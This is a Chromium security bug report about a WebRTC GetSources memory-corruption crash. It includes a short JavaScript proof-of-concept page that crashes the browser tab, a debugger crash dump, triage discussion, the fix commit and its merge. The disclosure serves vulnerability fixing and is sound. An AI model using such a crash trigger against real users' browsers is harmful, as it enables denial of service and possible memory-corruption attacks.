# Security: WebRTC - Memory corruption in WebRtcVoiceMediaChannel::GetSources()

| Field | Value |
|-------|-------|
| **Issue ID** | [40089875](https://issues.chromium.org/issues/40089875) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P1 |
| **Component** | Blink>WebRTC |
| **Platforms** | Android, Linux, Mac, Windows, ChromeOS |
| **Reporter** | lo...@gmail.com |
| **Assignee** | zh...@chromium.org |
| **Created** | 2017-12-11 |
| **Bounty** | $3,000.00 |

## Description

**VULNERABILITY DETAILS**  

Steps to reproduce:

```
1.Open PoC GetSources_PoC.html in Chrome browser.  
2.Chrome crashes by executing invalid address pointed to by corrupted EIP from WebRtcVoiceMediaChannel::GetSources().  

	(51a0.a50): Access violation - code c0000005 (!!! second chance !!!)  
	eax=07dcdbb8 ebx=0c0fbc80 ecx=0c0f12c0 edx=5fac4fcc esi=0bbbf584 edi=0c0f1280  
	eip=0d94fbf6 esp=0bbbf548 ebp=0bbbf55c iopl=0         ov up ei pl nz ac po nc  
	cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010a12  
	0d94fbf6 ??              ???  

```

**VERSION**  

Chrome Version: Google Chrome 64.0.3282.14 (Official Build) dev (32-bit) (cohort: Dev)  

Operating System: Windows 10

**REPRODUCTION CASE** (GetSources\_PoC.html)  

<script>  

var context = new AudioContext();  

var streamDestNode = context.createMediaStreamDestination();  

var rtcConfig = { "iceServers": [{ "urls": "stun:stun2.l.google.com:19302" }, ] };  

var pc = new RTCPeerConnection(rtcConfig);  

setInterval(function(){  

pc.createOffer(function(offer) {pc.setRemoteDescription(offer).then( function(){  

pc.addTrack(streamDestNode.stream.getTracks()[0], streamDestNode.stream);;  

}).catch(function(e){});}, function(e) {});  

}, 25);  

setInterval(function(){ pc.getReceivers()[0].getContributingSources()[0]; }, 88);  

</script>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State:

```
(51a0.a50): Access violation - code c0000005 (!!! second chance !!!)  
eax=07dcdbb8 ebx=0c0fbc80 ecx=0c0f12c0 edx=5fac4fcc esi=0bbbf584 edi=0c0f1280  
eip=0d94fbf6 esp=0bbbf548 ebp=0bbbf55c iopl=0         ov up ei pl nz ac po nc  
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010a12  
0d94fbf6 ??              ???  
9:184> !analyze -v  
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  
\*                                                                             \*  
\*                        Exception Analysis                                   \*  
\*                                                                             \*  
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*  

GetUrlPageData2 (WinHttp) failed: 12002.  

FAULTING_IP:   
+0  
0d94fbf6 ??              ???  

EXCEPTION_RECORD:  (.exr -1)  
ExceptionAddress: 0d94fbf6  
   ExceptionCode: c0000005 (Access violation)  
  ExceptionFlags: 00000000  
NumberParameters: 2  
   Parameter[0]: 00000008  
   Parameter[1]: 0d94fbf6  
Attempt to execute non-executable address 0d94fbf6  

FAULTING_THREAD:  00000a50  

DEFAULT_BUCKET_ID:  SOFTWARE_NX_FAULT  

PROCESS_NAME:  chrome.exe  

ERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s.  

EXCEPTION_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%p referenced memory at 0x%p. The memory could not be %s.  

EXCEPTION_PARAMETER1:  00000008  

EXCEPTION_PARAMETER2:  0d94fbf6  

WRITE_ADDRESS:  0d94fbf6   

FOLLOWUP_IP:   
chrome_child!cricket::WebRtcVoiceMediaChannel::GetSources+26 [C:\b\c\b\win_clang\src\third_party\webrtc\media\engine\webrtcvoiceengine.cc @ 2329]  
124df818 89f0            mov     eax,esi  

FAILED_INSTRUCTION_ADDRESS:   
+0  
0d94fbf6 ??              ???  

BUGCHECK_STR:  SOFTWARE_NX_FAULT  

NTGLOBALFLAG:  400  

APPLICATION_VERIFIER_FLAGS:  0  

APP:  chrome.exe  

ANALYSIS_VERSION: 10.0.10240.9 x86fre  

IP_ON_HEAP:  0d94fbf6  
The fault address in not in any loaded module, please check your build's rebase  
log at <releasedir>\bin\build_logs\timebuild\ntrebase.log for module which may  
contain the address if it were loaded.  

IP_IN_FREE_BLOCK: d94fbf6  

LAST_CONTROL_TRANSFER:  from 124df818 to 0d94fbf6  

STACK_TEXT:    
WARNING: Frame IP not in any known module. Following frames may be wrong.  
0bbbf544 124df818 0bbbf584 0bbbf584 5fac4fcc 0xd94fbf6  
0bbbf55c 12ada9a3 0bbbf584 5fac4fcc 0babf588 chrome_child!cricket::WebRtcVoiceMediaChannel::GetSources+0x26  
0bbbf574 12ade404 0bbbf584 5fac4fcc 0bbbf59c chrome_child!cricket::VoiceChannel::GetSources_w+0x19  
0bbbf59c 125333fe 0babf4b0 0c10fb28 0c14f2e8 chrome_child!rtc::FunctorMessageHandler<std::vector<webrtc::RtpSource,std::allocator<webrtc::RtpSource> >,rtc::MethodFunctor<const cricket::VoiceChannel,std::vector<webrtc::RtpSource,std::allocator<webrtc::RtpSource> > (cricket::VoiceChannel::\*)(unsigned int) __attribute__((thiscall)) const,std::vector<webrtc::RtpSource,std::allocator<webrtc::RtpSource> >,unsigned int> >::OnMessage+0x22  
0bbbf610 125337a9 0babf4b0 0b2d2ee0 0bbbf660 chrome_child!jingle_glue::JingleThreadWrapper::Dispatch+0x38  
0bbbf62c 0fe2e307 0b4a1830 00000000 00000000 chrome_child!jingle_glue::JingleThreadWrapper::ProcessPendingSends+0x65  
0bbbf69c 0fe2e263 12fb0c6c 0bbbf758 0bbbf730 chrome_child!base::debug::TaskAnnotator::RunTask+0x97  
0bbbf6ac 0fe2ddc6 0bbbf758 13630f26 07d63de0 chrome_child!base::internal::IncomingTaskQueue::RunTask+0x13  
0bbbf730 0fe2dbeb 0bbbf758 0fe2c81c 74251e3f chrome_child!base::MessageLoop::RunTask+0x1b6  
0bbbf750 0fe2594e 00000000 12e6bfd9 13630f26 chrome_child!base::MessageLoop::DeferOrRunPendingTask+0x5b  
0bbbf804 0fe25857 07dac2f8 07dac2f0 07d63d74 chrome_child!base::MessageLoop::DoWork+0xde  
0bbbf820 0fe257af 07d63d70 0bbbf864 0bbbf844 chrome_child!base::MessagePumpDefault::Run+0x87  
0bbbf830 0fe255ee 00000001 07dc2e24 0bbbf864 chrome_child!base::MessageLoop::Run+0x1f  
0bbbf844 0fe255bb 0bbbf88c 0fe25433 0bbbf864 chrome_child!base::RunLoop::Run+0x2e  
0bbbf84c 0fe25433 0bbbf864 07d63d70 00000000 chrome_child!base::Thread::Run+0xb  
0bbbf88c 10ed7019 07dc2e24 000004d4 000004d4 chrome_child!base::Thread::ThreadMain+0x153  
0bbbf8b0 75808654 0b395270 75808630 1912b53e chrome_child!base::`anonymous namespace'::ThreadFunc+0xb9  
0bbbf8c4 77584a47 0b395270 1bf8c88f 00000000 KERNEL32!BaseThreadInitThunk+0x24  
0bbbf90c 77584a17 ffffffff 775a9ed4 00000000 ntdll!__RtlUserThreadStart+0x2f  
0bbbf91c 00000000 10ed6f60 0b395270 00000000 ntdll!_RtlUserThreadStart+0x1b  


FAULTING_SOURCE_LINE:  C:\b\c\b\win_clang\src\third_party\webrtc\media\engine\webrtcvoiceengine.cc  

FAULTING_SOURCE_FILE:  C:\b\c\b\win_clang\src\third_party\webrtc\media\engine\webrtcvoiceengine.cc  

FAULTING_SOURCE_LINE_NUMBER:  2329  

FAULTING_SOURCE_CODE:    
  2325:   RTC_DCHECK(it != recv_streams_.end())  
  2326:       << "Attempting to get contributing sources for SSRC:" << ssrc  
  2327:       << " which doesn't exist.";  
  2328:   return it->second->GetSources();  
> 2329: }  
  2330:   
  2331: int WebRtcVoiceMediaChannel::GetReceiveChannelId(uint32_t ssrc) const {  
  2332:   RTC_DCHECK(worker_thread_checker_.CalledOnValidThread());  
  2333:   const auto it = recv_streams_.find(ssrc);  
  2334:   if (it != recv_streams_.end()) {  


SYMBOL_STACK_INDEX:  1  

SYMBOL_NAME:  chrome_child!cricket::WebRtcVoiceMediaChannel::GetSources+26  

FOLLOWUP_NAME:  MachineOwner  

MODULE_NAME: chrome_child  

IMAGE_NAME:  chrome_child.dll  

DEBUG_FLR_IMAGE_TIMESTAMP:  5a28be86  

STACK_COMMAND:  ~184s ; kb  

BUCKET_ID:  SOFTWARE_NX_FAULT_BAD_IP_chrome_child!cricket::WebRtcVoiceMediaChannel::GetSources+26  

PRIMARY_PROBLEM_CLASS:  SOFTWARE_NX_FAULT_BAD_IP_chrome_child!cricket::WebRtcVoiceMediaChannel::GetSources+26  

FAILURE_PROBLEM_CLASS:  SOFTWARE_NX_FAULT  

FAILURE_EXCEPTION_CODE:  c0000005  

FAILURE_IMAGE_NAME:  chrome_child.dll  

FAILURE_FUNCTION_NAME:  cricket::WebRtcVoiceMediaChannel::GetSources  

FAILURE_SYMBOL_NAME:  chrome_child.dll!cricket::WebRtcVoiceMediaChannel::GetSources  

FAILURE_BUCKET_ID:  SOFTWARE_NX_FAULT_c0000005_chrome_child.dll!cricket::WebRtcVoiceMediaChannel::GetSources  

ANALYSIS_SOURCE:  UM  

FAILURE_ID_HASH_STRING:  um:software_nx_fault_c0000005_chrome_child.dll!cricket::webrtcvoicemediachannel::getsources  

FAILURE_ID_HASH:  {786de068-5b23-3ebd-de58-22cbd82d7410}  

Followup:     MachineOwner  
---------  

```

## Attachments

- [GetSources_PoC.html](attachments/GetSources_PoC.html) (text/plain, 557 B)

## Timeline

### el...@chromium.org (2017-12-11)

Reproduced in 65.0.3291.1 and 64.0.3282.14 but not 63.0.3239.84.

[Monorail components: Blink>WebRTC]

### el...@chromium.org (2017-12-11)

Please take a look?

### el...@chromium.org (2017-12-12)

Notably, Clusterfuzz claims this is a "Null-dereference READ" which wouldn't be exploitable beyond DoS, but the original report's analysis was a much more severe "Attempt to execute non-executable address 0d94fbf6."


Detailed report: https://clusterfuzz.com/testcase?key=6004948310687744


### hb...@chromium.org (2017-12-13)

Thanks! I will take a look shortly.

### hb...@chromium.org (2017-12-13)

+CC WebRTC layer folks who worked on this.

### sh...@chromium.org (2017-12-13)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-12-13)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security_Impact or Security_Severity labels, and remove the ReleaseBlock label. To disable this altogether, apply ReleaseBlock-NA.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### zh...@chromium.org (2017-12-13)

Looks like it will crash when calling GetSource is called when ssrc is not signaled.
But not sure why it cannot be reproduced on m63. The GetSources code has been there for  several months.

Anyway I'll fix it first.

### hb...@chromium.org (2017-12-13)

Thanks!

### hb...@chromium.org (2017-12-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2017-12-13)

The following revision refers to this bug:
  https://webrtc.googlesource.com/src.git/+/fa266efb27f6e7db548a9c52f8f28bad911e4fd2

commit fa266efb27f6e7db548a9c52f8f28bad911e4fd2
Author: Zhi Huang <zhihuang@webrtc.org>
Date: Wed Dec 13 22:46:01 2017

Fix the crash when GetSources is called with non-existing ssrc.

When GetSources is called with non-existing ssrc, it will log the
error and return an empty RtpSource list instead of hitting the DCHECK.

Bug: chromium:793699
Change-Id: I30bebb657de32f87f9c82920fa0b19403893791f
Reviewed-on: https://webrtc-review.googlesource.com/32860
Reviewed-by: Taylor Brandstetter <deadbeef@webrtc.org>
Reviewed-by: Henrik Boström <hbos@webrtc.org>
Commit-Queue: Zhi Huang <zhihuang@webrtc.org>
Cr-Commit-Position: refs/heads/master@{#21258}
[modify] https://crrev.com/fa266efb27f6e7db548a9c52f8f28bad911e4fd2/media/engine/webrtcvoiceengine.cc
[modify] https://crrev.com/fa266efb27f6e7db548a9c52f8f28bad911e4fd2/media/engine/webrtcvoiceengine_unittest.cc


### hb...@chromium.org (2017-12-14)

Zhi have you verified the fix and will you take care of merging this to M64?

### zh...@chromium.org (2017-12-14)

I can take care of that. 

### zh...@chromium.org (2017-12-19)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-12-19)

This bug requires manual review: M64 has already been promoted to the beta branch, so this requires manual review
Please contact the milestone owner if you have questions.
Owners: cmasso@(Android), cmasso@(iOS), kbleicher@(ChromeOS), abdulsyed@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### cl...@chromium.org (2017-12-19)

ClusterFuzz has detected this issue as fixed in range 524734:524736.

Detailed report: https://clusterfuzz.com/testcase?key=6004948310687744

Job Type: linux_asan_chrome_mp
Crash Type: Null-dereference READ
Crash Address: 0x000000000000
Crash State:
  cricket::WebRtcVoiceMediaChannel::GetSources
  cricket::VoiceChannel::GetSources_w
  rtc::FunctorMessageHandler<std::__1::vector<webrtc::RtpSource, std::__1::allocat
  
Sanitizer: address (ASAN)

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=520135:520136
Fixed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=524734:524736

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=6004948310687744

See https://github.com/google/clusterfuzz-tools for more information.

If you suspect that the result above is incorrect, try re-doing that job on the test case report page.

### cl...@chromium.org (2017-12-19)

ClusterFuzz has detected this issue as fixed in range 524734:524736.

Detailed report: https://clusterfuzz.com/testcase?key=5696898760704000

Job Type: linux_asan_chrome_mp
Crash Type: Null-dereference READ
Crash Address: 0x000000000000
Crash State:
  cricket::WebRtcVoiceMediaChannel::GetSources
  cricket::VoiceChannel::GetSources_w
  rtc::FunctorMessageHandler<std::__1::vector<webrtc::RtpSource, std::__1::allocat
  
Sanitizer: address (ASAN)

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=520135:520136
Fixed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=524734:524736

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5696898760704000

See https://github.com/google/clusterfuzz-tools for more information.

If you suspect that the result above is incorrect, try re-doing that job on the test case report page.

### cl...@chromium.org (2017-12-19)

ClusterFuzz testcase 5696898760704000 is verified as fixed, so closing issue as verified.

If this is incorrect, please add ClusterFuzz-Wrong label and re-open the issue.

### sh...@chromium.org (2017-12-19)

[Empty comment from Monorail migration]

### ab...@chromium.org (2017-12-19)

Has this been well tested and verified in Canary? Is this a safe merge overall?

### de...@chromium.org (2017-12-19)

I'd say this is pretty safe. It's a 5 line change that will just return an empty list instead of dereferencing an out of bounds iterator, and returning an empty list is entirely valid in this context.

### ab...@chromium.org (2017-12-19)

Approving merge to M64, branch:3282.

### de...@chromium.org (2017-12-19)

[Empty comment from Monorail migration]

### hb...@chromium.org (2017-12-28)

zhihuang@ remember to merge when you get back.

### zh...@chromium.org (2017-12-29)

I made a cheery-pick CL before I left (https://webrtc-review.googlesource.com/c/src/+/33160) which is waiting for an appoval. hbos@ do you have the power to approve it?

### hb...@chromium.org (2017-12-29)

Probably not, I don't know about merging but I'm not a media OWNER. I LGTM'd it though and you might be able to TBR deadbeef or pthatcher.

### aw...@google.com (2018-01-02)

[Empty comment from Monorail migration]

### bu...@chromium.org (2018-01-03)

The following revision refers to this bug:
  https://webrtc.googlesource.com/src.git/+/88f5d9180eae78a6162cccd78850ff416eb82483

commit 88f5d9180eae78a6162cccd78850ff416eb82483
Author: Zhi Huang <zhihuang@webrtc.org>
Date: Wed Jan 03 18:23:33 2018

Merge to M64: Fix the crash when GetSources is called with non-existing ssrc.

When GetSources is called with non-existing ssrc, it will log the
error and return an empty RtpSource list instead of hitting the DCHECK.

Bug: chromium:793699
Change-Id: I30bebb657de32f87f9c82920fa0b19403893791f
Reviewed-on: https://webrtc-review.googlesource.com/32860
Reviewed-by: Taylor Brandstetter <deadbeef@webrtc.org>
Reviewed-by: Henrik Boström <hbos@webrtc.org>
Commit-Queue: Zhi Huang <zhihuang@webrtc.org>
Cr-Original-Commit-Position: refs/heads/master@{#21258}
Reviewed-on: https://webrtc-review.googlesource.com/33160
Reviewed-by: Peter Thatcher <pthatcher@webrtc.org>
Cr-Commit-Position: refs/branch-heads/64@{#8}
Cr-Branched-From: aede67a199ae0552074bfec4bb03cc9a6a5fba0f-refs/heads/master@{#20918}
[modify] https://crrev.com/88f5d9180eae78a6162cccd78850ff416eb82483/media/engine/webrtcvoiceengine.cc
[modify] https://crrev.com/88f5d9180eae78a6162cccd78850ff416eb82483/media/engine/webrtcvoiceengine_unittest.cc


### aw...@chromium.org (2018-01-05)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### cm...@chromium.org (2018-01-05)

Please merge the approved cl(s) to M64 release branch 3282 as soon as possible.

### zh...@chromium.org (2018-01-06)

The CL was merged to WebRTC M64(https://webrtc.googlesource.com/src/+log/branch-heads/64)

### aw...@google.com (2018-01-06)

And $3,000 for this report, cheers!

### aw...@chromium.org (2018-01-06)

[Empty comment from Monorail migration]

### cm...@chromium.org (2018-01-09)

[Empty comment from Monorail migration]

### cm...@google.com (2018-01-10)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-03-27)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-03-27)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@google.com (2018-03-31)

[Empty comment from Monorail migration]

### is...@google.com (2018-03-31)

This issue was migrated from crbug.com/chromium/793699?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40089875)*
